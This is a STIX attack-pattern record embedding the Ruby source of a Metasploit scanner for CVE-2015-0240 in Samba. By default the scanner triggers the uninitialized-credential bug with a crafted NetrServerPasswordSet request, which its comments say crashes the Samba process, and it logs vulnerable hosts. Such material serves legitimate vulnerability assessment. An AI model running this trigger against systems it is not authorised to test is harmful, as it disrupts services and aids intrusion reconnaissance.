{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--edcfb1e9-5756-4b4f-a880-3f20d49fc5cd",
    "created": "2024-08-14T16:31:13.6451Z",
    "modified": "2024-08-14T16:31:13.645103Z",
    "name": "Samba _netr_ServerPasswordSet Uninitialized Credential State",
    "description": " This module checks if a Samba target is vulnerable to an uninitialized variable creds vulnerability. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/smb/smb_uninit_cred.rb",
            "external_id": "smb_uninit_cred.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-0240"
        },
        {
            "source_name": "reference",
            "url": "https://www.redhat.com/en/blog/samba-vulnerability-cve-2015-0240"
        },
        {
            "source_name": "reference",
            "url": "https://gist.github.com/worawit/33cc5534cb555a0b710b"
        },
        {
            "source_name": "reference",
            "url": "https://www.nccgroup.com/en/blog/2015/03/samba-_netr_serverpasswordset-expoitability-analysis/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nclass MetasploitModule < Msf::Auxiliary\n\n  # Exploit mixins should be called first\n  include Msf::Exploit::Remote::DCERPC\n  include Msf::Exploit::Remote::SMB::Client\n  include Msf::Exploit::Remote::SMB::Client::Authenticated\n\n  # Scanner mixin should be near last\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n\n  # Aliases for common classes\n  SIMPLE = Rex::Proto::SMB::SimpleClient\n  XCEPT  = Rex::Proto::SMB::Exceptions\n  CONST  = Rex::Proto::SMB::Constants\n\n  RPC_NETLOGON_UUID = '12345678-1234-abcd-ef00-01234567cffb'\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => 'Samba _netr_ServerPasswordSet Uninitialized Credential State',\n      'Description'    => %q{\n        This module checks if a Samba target is vulnerable to an uninitialized variable creds vulnerability.\n      },\n      'Author'         =>\n        [\n          'Richard van Eeden', # Original discovery\n          'sleepya',           # Public PoC for the explicit check\n          'sinn3r'\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['CVE', '2015-0240'],\n          ['OSVDB', '118637'],\n          ['URL', 'https://www.redhat.com/en/blog/samba-vulnerability-cve-2015-0240'],\n          ['URL', 'https://gist.github.com/worawit/33cc5534cb555a0b710b'],\n          ['URL', 'https://www.nccgroup.com/en/blog/2015/03/samba-_netr_serverpasswordset-expoitability-analysis/']\n        ],\n      'DefaultOptions' =>\n        {\n          'SMBDirect'               => true,\n          'SMBPass'                 => '',\n          'SMBUser'                 => '',\n          'SMBDomain'               => '',\n          'DCERPC::fake_bind_multi' => false\n        }\n    ))\n\n    # This is a good example of passive vs explicit check\n    register_options([\n      OptBool.new('PASSIVE', [false, 'Try banner checking instead of triggering the bug', false])\n    ])\n\n    # It's either 139 or 445. The user should not touch this.\n    deregister_options('RPORT')\n  end\n\n  def rport\n    @smb_port || datastore['RPORT']\n  end\n\n\n  # This method is more explicit, but a major downside is it's very slow.\n  # So we leave the passive one as an option.\n  # Please also see #maybe_vulnerable?\n  def is_vulnerable?(ip)\n    begin\n      connect\n      smb_login\n      handle = dcerpc_handle(RPC_NETLOGON_UUID, '1.0','ncacn_np', [\"\\\\netlogon\"])\n      dcerpc_bind(handle)\n    rescue ::Rex::Proto::SMB::Exceptions::LoginError,\n      ::Rex::Proto::SMB::Exceptions::ErrorCode => e\n      elog(e)\n      return false\n    rescue Errno::ECONNRESET,\n        ::Rex::Proto::SMB::Exceptions::InvalidType,\n        ::Rex::Proto::SMB::Exceptions::ReadPacket,\n        ::Rex::Proto::SMB::Exceptions::InvalidCommand,\n        ::Rex::Proto::SMB::Exceptions::InvalidWordCount,\n        ::Rex::Proto::SMB::Exceptions::NoReply => e\n      elog(e)\n      return false\n    rescue ::Exception => e\n      elog(e)\n      return false\n    end\n\n    # NetrServerPasswordSet request packet\n    stub =\n      [\n        0x00,                         # Server handle\n        0x01,                         # Max count\n        0x00,                         # Offset\n        0x01,                         # Actual count\n        0x00,                         # Account name\n        0x02,                         # Sec Chan Type\n        0x0e,                         # Max count\n        0x00,                         # Offset\n        0x0e                          # Actual count\n      ].pack('VVVVvvVVV')\n\n    stub << Rex::Text::to_unicode(ip) # Computer name\n    stub << [0x00].pack('v')          # Null byte terminator for the computer name\n    stub << '12345678'                # Credential\n    stub << [0x0a].pack('V')          # Timestamp\n    stub << \"\\x00\" * 16               # Padding\n\n    begin\n      dcerpc.call(0x06, stub)\n    rescue ::Rex::Proto::SMB::Exceptions::ErrorCode => e\n      elog(e)\n    rescue Errno::ECONNRESET,\n        ::Rex::Proto::SMB::Exceptions::InvalidType,\n        ::Rex::Proto::SMB::Exceptions::ReadPacket,\n        ::Rex::Proto::SMB::Exceptions::InvalidCommand,\n        ::Rex::Proto::SMB::Exceptions::InvalidWordCount,\n        ::Rex::Proto::SMB::Exceptions::NoReply => e\n      elog(e)\n    rescue ::Exception => e\n      if e.to_s =~ /execution expired/i\n        # So what happens here is that when you trigger the buggy code path, you hit this:\n        #   Program received signal SIGSEGV, Segmentation fault.\n        #   0xb732ab3b in talloc_chunk_from_ptr (ptr=0xc) at ../lib/talloc/talloc.c:370\n        #   370   if (unlikely((tc->flags & (TALLOC_FLAG_FREE | ~0xF)) != TALLOC_MAGIC)) {\n        # In the Samba log, you'll see this as an \"internal error\" and there will be a \"panic action\".\n        # And then Samba will basically not talk back to you at that point. In that case,\n        # you will either lose the connection, or timeout, or whatever... depending on the SMB\n        # API you're using. In our case (Metasploit), it's \"execution expired.\"\n        # Samba (daemon) will stay alive, so it's all good.\n        return true\n      else\n        raise e\n      end\n    end\n\n    false\n  ensure\n    disconnect\n  end\n\n\n  # Returns the Samba version\n  def get_samba_info\n    res = ''\n    begin\n      res = smb_fingerprint\n    rescue ::Rex::Proto::SMB::Exceptions::LoginError,\n      ::Rex::Proto::SMB::Exceptions::ErrorCode\n      return res\n    rescue Errno::ECONNRESET,\n        ::Rex::Proto::SMB::Exceptions::InvalidType,\n        ::Rex::Proto::SMB::Exceptions::ReadPacket,\n        ::Rex::Proto::SMB::Exceptions::InvalidCommand,\n        ::Rex::Proto::SMB::Exceptions::InvalidWordCount,\n        ::Rex::Proto::SMB::Exceptions::NoReply\n      return res\n    rescue ::Exception => e\n      if e.to_s =~ /execution expired/\n        return res\n      else\n        raise e\n      end\n    ensure\n      disconnect\n    end\n\n    res['native_lm'].to_s\n  end\n\n\n  # Converts a version string into an object so we can eval it\n  def version(v)\n    Rex::Version.new(v)\n  end\n\n\n  # Passive check for the uninitialized bug. The information is based on http://cve.mitre.org/\n  def maybe_vulnerable?(samba_version)\n    v = samba_version.scan(/Samba (\\d+\\.\\d+\\.\\d+)/).flatten[0] || ''\n    return false if v.empty?\n    found_version = version(v)\n\n    if found_version >= version('3.5.0') && found_version <= version('3.5.9')\n      return true\n    elsif found_version >= version('3.6.0') && found_version < version('3.6.25')\n      return true\n    elsif found_version >= version('4.0.0') && found_version < version('4.0.25')\n      return true\n    elsif found_version >= version('4.1.0') && found_version < version('4.1.17')\n      return true\n    end\n\n    false\n  end\n\n\n  # Check command\n  def check_host(ip)\n    samba_info = ''\n    smb_ports = [445, 139]\n    smb_ports.each do |port|\n      @smb_port = port\n      samba_info = get_samba_info\n      vprint_status(\"Samba version: #{samba_info}\")\n\n      if samba_info !~ /^samba/i\n        vprint_status(\"Target isn't Samba, no check will run.\")\n        return Exploit::CheckCode::Safe\n      end\n\n      if datastore['PASSIVE']\n        if maybe_vulnerable?(samba_info)\n          flag_vuln_host(ip, samba_info)\n          return Exploit::CheckCode::Appears\n        end\n      else\n        # Explicit: Actually triggers the bug\n        if is_vulnerable?(ip)\n          flag_vuln_host(ip, samba_info)\n          return Exploit::CheckCode::Vulnerable\n        end\n      end\n    end\n\n    return Exploit::CheckCode::Detected if samba_info =~ /^samba/i\n\n    Exploit::CheckCode::Safe\n  end\n\n\n  # Reports to the database about a possible vulnerable host\n  def flag_vuln_host(ip, samba_version)\n    report_vuln(\n      :host  => ip,\n      :port  => rport,\n      :proto => 'tcp',\n      :name  => self.name,\n      :info  => samba_version,\n      :refs  => self.references\n    )\n  end\n\n\n  def run_host(ip)\n    peer = \"#{ip}:#{rport}\"\n    case check_host(ip)\n    when Exploit::CheckCode::Vulnerable\n      print_good(\"The target is vulnerable to CVE-2015-0240.\")\n    when Exploit::CheckCode::Appears\n      print_good(\"The target appears to be vulnerable to CVE-2015-0240.\")\n    when Exploit::CheckCode::Detected\n      print_status(\"The target appears to be running Samba.\")\n    else\n      print_status(\"The target appears to be safe\")\n    end\n  end\nend\n\n"
}